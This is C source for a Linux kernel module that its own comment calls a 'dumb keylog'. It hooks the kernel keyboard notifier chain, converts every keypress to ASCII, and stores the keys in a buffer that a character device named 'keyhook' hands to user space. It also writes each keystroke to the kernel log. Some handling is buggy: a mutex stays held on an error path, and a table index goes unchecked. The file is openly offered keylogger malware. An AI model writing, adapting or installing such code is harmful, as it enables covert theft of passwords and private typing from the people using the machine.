// dumb keylog using notification chain api
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/mutex.h>
#include <linux/fs.h>

#include "us_scancode.h"

#define DEVICE_NAME "keyhook"
#define BUFFER_LIMIT 0x200


MODULE_LICENSE("GPL");
static int __init keyhook_init(void);
static void __exit keyhook_exit(void);
module_init(keyhook_init);
module_exit(keyhook_exit);

DEFINE_MUTEX(g_lock);
static unsigned char g_buffer[BUFFER_LIMIT+1];
static unsigned int  g_delta = 0;
// no need to sync, only ref in init/exit
static int g_devno = 0;

static int
keyhook_open(struct inode* inode, struct file* filp) {
  try_module_get(THIS_MODULE);
  return 0;
}

static int
keyhook_release(struct inode* inode, struct file* filp) {
  module_put(THIS_MODULE);
  return 0;
}

static ssize_t
keyhook_read(struct file* filp, char __user* buf, size_t len, loff_t* offset) {
  printk("[keyhook]: read initiated of %d bytes\n", g_delta);
  mutex_lock(&g_lock);
  if (copy_to_user(buf, g_buffer + *offset, g_delta))
    return -EFAULT;
  memset(g_buffer, 0, BUFFER_LIMIT);
  g_delta = 0; 
  mutex_unlock(&g_lock);
  return 0;
}

static int keyhook_cb(struct notifier_block* nb, size_t action, void* _param) {
  static unsigned char us_map[] = { SCANCODE2ASCII_TABLE };
  struct keyboard_notifier_param* kbp =
    (struct keyboard_notifier_param *)_param;
  printk("%c\n", us_map[kbp->value]);
  if (kbp->down && action == KBD_KEYCODE) {
    mutex_lock(&g_lock);
    if (g_delta < BUFFER_LIMIT)
      g_buffer[g_delta++] = us_map[kbp->value];
    mutex_unlock(&g_lock);
  }
  return NOTIFY_OK;
}

static struct notifier_block keyhook_nb = {
  .priority = 0,
  .notifier_call=keyhook_cb
};
static int __init keyhook_init(void) {
  printk("[keyhook]: driver initialized!\n");
  static struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = keyhook_open,
    .release = keyhook_release,
    .read = keyhook_read
  };
  mutex_init(&g_lock);
  g_devno = register_chrdev(0, DEVICE_NAME, &fops);
  if (g_devno < 0) {
    printk(KERN_ALERT "Could not allocate character device region!\n");
    return g_devno;
  }
  printk("[keyhook]: device assiged major number: %d\n", g_devno);
  register_keyboard_notifier(&keyhook_nb);
  
  return 0;
}
static void __exit keyhook_exit(void) {
  unregister_keyboard_notifier(&keyhook_nb);
  unregister_chrdev(g_devno, DEVICE_NAME);
  printk("[keyhook]: driver exited!\n");
  return;
}
